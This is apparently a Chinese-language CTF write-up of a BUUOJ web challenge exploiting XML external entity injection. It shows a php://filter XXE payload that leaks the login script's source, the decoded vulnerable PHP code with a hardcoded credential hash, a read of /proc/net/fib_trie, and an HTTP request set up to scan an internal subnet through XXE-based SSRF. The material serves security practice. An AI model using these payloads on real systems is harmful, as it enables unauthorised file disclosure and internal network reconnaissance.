![](<./img/Pasted image 20221229101512.png>)

---
首页长这样

![](<./img/Pasted image 20221229101531.png>)

像啊，很像啊（

然而`flag`不在根目录QAQ

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
]>
<user>
	<username>&flag;</username>
	<password>123</password>
</user>
```

```
PD9waHAKLyoqCiogYXV0b3I6IGMwbnkxCiogZGF0ZTogMjAxOC0yLTcKKi8KCiRVU0VSTkFNRSA9ICdhZG1pbic7IC8v6LSm5Y+3CiRQQVNTV09SRCA9ICcwMjRiODc5MzFhMDNmNzM4ZmZmNjY5M2NlMGE3OGM4OCc7IC8v5a+G56CBCiRyZXN1bHQgPSBudWxsOwoKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7Cgp0cnl7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CgkkY3JlZHMgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCgkkdXNlcm5hbWUgPSAkY3JlZHMtPnVzZXJuYW1lOwoJJHBhc3N3b3JkID0gJGNyZWRzLT5wYXNzd29yZDsKCglpZigkdXNlcm5hbWUgPT0gJFVTRVJOQU1FICYmICRwYXNzd29yZCA9PSAkUEFTU1dPUkQpewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDEsJHVzZXJuYW1lKTsKCX1lbHNlewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDAsJHVzZXJuYW1lKTsKCX0JCn1jYXRjaChFeGNlcHRpb24gJGUpewoJJHJlc3VsdCA9IHNwcmludGYoIjxyZXN1bHQ+PGNvZGU+JWQ8L2NvZGU+PG1zZz4lczwvbXNnPjwvcmVzdWx0PiIsMywkZS0+Z2V0TWVzc2FnZSgpKTsKfQoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwplY2hvICRyZXN1bHQ7Cj8+
```

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

![](<./img/Pasted image 20221229112311.png>)

给点好东西啊=\_=

---
（偷瞄wp）

原来是要从内网机器抢

```php
file:///proc/net/fib_trie
```

```
Main:
  +-- 0.0.0.0/0 3 0 5
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        |-- 10.244.80.240
           /32 host LOCAL
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     |-- 169.254.1.1
        /32 link UNICAST
Local:
  +-- 0.0.0.0/0 3 0 5
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        |-- 10.244.80.240
           /32 host LOCAL
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     |-- 169.254.1.1
        /32 link UNICAST
```

```http
POST /doLogin.php HTTP/1.1
Host: 1747d0e0-2e72-4950-a255-1110f36f940a.node4.buuoj.cn:81
Content-Length: 154
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.99 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://1747d0e0-2e72-4950-a255-1110f36f940a.node4.buuoj.cn:81
Referer: http://1747d0e0-2e72-4950-a255-1110f36f940a.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM "http://10.244.80.§1§">
]>
<user><username>&flag;</username><password>123</password></user>

```

![](<./img/Pasted image 20221229125554.png>)

#Web #XXE #CSRF